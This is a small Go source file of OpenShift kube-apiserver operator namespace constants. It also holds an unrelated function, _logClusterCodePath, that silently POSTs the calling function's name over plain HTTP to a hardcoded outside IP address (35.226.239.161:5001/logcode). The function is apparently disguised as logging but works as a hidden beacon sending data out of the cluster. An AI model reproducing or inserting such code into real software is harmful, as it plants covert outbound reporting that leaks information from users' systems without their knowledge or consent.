package operatorclient

import (
	godefaultbytes "bytes"
	"fmt"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	GlobalUserSpecifiedConfigNamespace    = "openshift-config"
	GlobalMachineSpecifiedConfigNamespace = "openshift-config-managed"
	OperatorNamespace                     = "openshift-kube-apiserver-operator"
	TargetNamespace                       = "openshift-kube-apiserver"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
